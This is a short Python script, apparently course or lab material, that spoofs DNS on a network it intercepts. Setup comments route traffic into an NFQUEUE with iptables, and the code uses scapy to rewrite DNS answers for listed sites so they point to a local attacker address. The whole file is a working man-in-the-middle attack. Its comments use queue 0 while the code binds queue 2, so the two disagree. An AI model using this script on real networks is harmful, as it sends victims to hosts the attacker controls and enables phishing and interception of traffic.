#!/usr/bin/env python
## works well with python 2

# before anything run the below command in you machine
# creating queue to trap incoming packets
## iptables -I FORWARD -j NFQUEUE --queue-num 0
# to restore to default
## iptables --flush

# for testing on your own machine
## iptables -I OUTPUT -j NFQUEUE --queue-num 0
## iptables -I INPUT -j NFQUEUE --queue-num 0
# to restore to default
## iptables --flush

import netfilterqueue
import scapy.all as scapy


def process_packet(packet):
    list_of_websites = ["www.Bing.com", "www.vulnweb.com", "info.cern.ch/hypertext/WWW/TheProject.html"]
    scapy_packet = scapy.IP(packet.get_payload())
    # DNSRR is response and DNSQR is request
    if scapy_packet.haslayer(scapy.DNSRR):
        requested_website = scapy_packet[scapy.DNSQR].qname
        for item in list_of_websites:
            if item in str(requested_website):
                print("\r[+] Spoofing target.......")
                # print(scapy_packet.show())
                # creating a scapy modified/spoofed packet
                answer = scapy.DNSRR(rrname=requested_website, rdata="192.168.217.131")
                # setting packet to what we created above
                scapy_packet[scapy.DNS].an = answer
                # setting no of answer to be sent
                scapy_packet[scapy.DNS].ancount = 1

                # removing chksum and len field that may corrupt our modified packet from ip layer
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.IP].len
                # removing chksum and len field that may corrupt our modified packet from udp layer
                del scapy_packet[scapy.UDP].chksum
                del scapy_packet[scapy.UDP].len
                # deleting helps us as scapy will include these fields itself after calculating them

                # reconverting/setting payload of packet variable equal to scapy packet
                packet.set_payload(str(scapy_packet))
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(2, process_packet)
queue.run()
